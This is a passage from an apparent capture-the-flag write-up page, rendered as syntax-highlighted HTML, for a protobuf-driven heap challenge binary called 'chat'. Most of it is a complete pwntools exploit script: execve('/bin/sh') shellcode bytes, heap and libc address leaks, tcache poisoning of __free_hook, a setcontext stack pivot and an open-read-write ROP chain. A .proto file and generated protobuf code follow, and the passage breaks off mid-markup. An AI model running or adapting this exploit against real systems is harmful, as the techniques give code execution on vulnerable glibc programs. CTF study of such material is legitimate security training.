string">b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg1  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;34m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg2  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;37m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pn   <span class="token operator">=</span> <span class="token keyword">lambda</span> name          <span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span>    <span class="token comment">#------------------------------------------------------------------------------------------</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">import</span> x1nri_pb2context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">"./chat"</span><span class="token comment">#context.log_level="debug"</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token comment">#------------------------------------------------------------------</span>choose<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">if</span> choose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#ENV=&#123;"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"&#125;</span><span class="token comment">#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">botmessage</span><span class="token punctuation">(</span>flag<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">,</span> choice<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">,</span> idx<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>msg<span class="token operator">=</span>x1nri_pb2<span class="token punctuation">.</span>msg<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>choice<span class="token operator">=</span>choicemsg<span class="token punctuation">.</span>idx<span class="token operator">=</span>idxmsg<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token keyword">return</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'Please input your data: '</span><span class="token punctuation">,</span>botmessage<span class="token punctuation">(</span><span class="token string">'ADD'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Please input the content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'Please input your data: '</span><span class="token punctuation">,</span>botmessage<span class="token punctuation">(</span><span class="token string">'DELETE'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'Please input your data: '</span><span class="token punctuation">,</span>botmessage<span class="token punctuation">(</span><span class="token string">'SHOW'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'Please input your data: '</span><span class="token punctuation">,</span>botmessage<span class="token punctuation">(</span><span class="token string">'EDIT'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Please input the content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#-----leak heap</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>leakheap<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>heap_base<span class="token operator">=</span>leakheap<span class="token operator">-</span><span class="token number">0x3e0</span>lg<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_base<span class="token punctuation">)</span><span class="token comment">#-------control size to leak libc</span>target<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x2e0</span><span class="token comment">#0</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x421</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>uu64<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ecbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">,</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>getkeyserv_handle_576<span class="token operator">=</span><span class="token number">0x0000000000151990</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token comment">#---------getkeyserv_handle_576</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>getkeyserv_handle_576<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#__free_hook</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'frame1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'frame1chunk_mem'</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x930</span><span class="token punctuation">)</span><span class="token comment">#setcontext</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'frame2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'frame2chunk_mem'</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0xa00</span><span class="token punctuation">)</span><span class="token comment">#frame</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'rop'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>lg<span class="token punctuation">(</span><span class="token string">'ropchunk_mem'</span><span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0xad0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x930</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#rdx</span>edit<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'setcontext'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0xad0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000022679</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#frame=p64(0)+p64(heap_base+0xa00)+p64(0x000000000000101a+libc.address)#rcx,rsp,rip</span><span class="token comment">#edit(10,bytes(frame))</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000023b6a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressrsi<span class="token operator">=</span><span class="token number">0x000000000002601f</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressrdx<span class="token operator">=</span><span class="token number">0x0000000000142c92</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addressOPEN<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'open'</span><span class="token punctuation">)</span>READ<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'read'</span><span class="token punctuation">)</span>WRITE<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token comment">#---------pivot</span>pop_rsp_ret<span class="token operator">=</span><span class="token number">0x000000000002f70a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>addresspivot<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x400</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>READ<span class="token punctuation">]</span><span class="token punctuation">)</span>pivot<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pop_rsp_ret<span class="token punctuation">,</span>heap_base<span class="token operator">+</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span>pivot<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment">#----------orw</span>flag_addr<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x400</span><span class="token operator">+</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">*</span><span class="token number">8</span>target<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x500</span>orw<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>flag_addr<span class="token punctuation">,</span>rsi<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>OPEN<span class="token punctuation">]</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>target<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>READ<span class="token punctuation">]</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>rsi<span class="token punctuation">,</span>target<span class="token punctuation">,</span>rdx<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span>WRITE<span class="token punctuation">]</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span><span class="token string">b'./flag\x00'</span>s<span class="token punctuation">(</span>orw<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>x1nri.protoï¼š</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">syntax = "proto2"; package tutorial; message msg &#123;required string flag = 1;required int64 choice = 2;required int64 idx = 3;required int64 size = 4;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>x1nri_pb2.pyï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span><span class="token comment"># source: x1nri.proto</span><span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> descriptor <span class="token keyword">as</span> _descriptor<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> message <span class="token keyword">as</span> _message<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> reflection <span class="token keyword">as</span> _reflection<span class="token keyword">from</span> google<span class="token punctuation">.</span>protobuf <span class="token keyword">import</span> symbol_database <span class="token keyword">as</span> _symbol_database<span class="token comment"># @@protoc_insertion_point(imports)</span>_sym_db <span class="token operator">=</span> _symbol_database<span class="token punctuation">.</span>Default<span class="token punctuation">(</span><span class="token punctuation">)</span>DESCRIPTOR <span class="token operator">=</span> _descriptor<span class="token punctuation">.</span>FileDescriptor<span class="token punctuation">(</span>  name<span class="token operator">=</span><span class="token string">'x1nri.proto'</span><span class="token punctuation">,</span>  package<span class="token operator">=</span><span class="token string">'tutorial'</span><span class="token punctuation">,</span>  syntax<span class="token operator">=</span><span class="token string">'proto2'</span><span class="token punctuation">,</span>  serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">,</span>  serialized_pb<span class="token operator">=</span><span class="token string">b'\n\x0bx1nri.proto\x12\x08tutorial\">\n\x03msg\x12\x0c\n\x04\x66lag\x18\x01 \x02(\t\x12\x0e\n\x06\x63hoice\x18\x02 \x02(\x03\x12\x0b\n\x03idx\x18\x03 \x02(\x03\x12\x0c\n\x04size\x18\x04 \x02(\x03'</span><span class="token punctuation">)</span>_MSG <span class="token operator">=</span> _descriptor<span class="token punctuation">.</span>Descriptor<span class="token punctuation">(</span>  name<span class="token operator">=</span><span class="token string">'msg'</span><span class="token punctuation">,</span>  full_name<span class="token operator">=</span><span class="token string">'tutorial.msg'</span><span class="token punctuation">,</span>  filename<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>  <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">,</span>  fields<span class="token operator">=</span><span class="token punctuation">[</span>    _descriptor<span class="token punctuation">.</span>FieldDescriptor<span class="token punctuation">(</span>      name<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">,</span> full_name<span class="token operator">=</span><span class="token string">'tutorial.msg.flag'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>      number<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span> cpp_type<span class="token operator">=</span><span class="token number">9</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      has_default_value<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default_value<span class="token operator">=</span><span class="token string">b""</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      message_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> enum_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      is_extension<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> extension_scope<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>DESCRIPTOR<span class="token punctuation">,</span>  create_key<span class="token operator">=</span>_descriptor<span class="token punctuation">.</span>_internal_create_key<span class="token punctuation">)</span><span class="token punctuation">,</span>    _descriptor<span class="token punctuation">.</span>FieldDescriptor<span class="token punctuation">(</span>      name<span class="token operator">=</span><span class="token string">'choice'</span><span class="token punctuation">,</span> full_name<span class="token operator">=</span><span class="token string">'tutorial.msg.choice'</span><span class="token punctuation">,</span> index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>      number<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> cpp_type<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>      has_default_value<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default_value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>      message_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> enum_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> containing_type<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      is_extension<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> extension_scope<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>      serialized_options<span class="token operator">=</span><span class="token boolean">None</span><span class="token 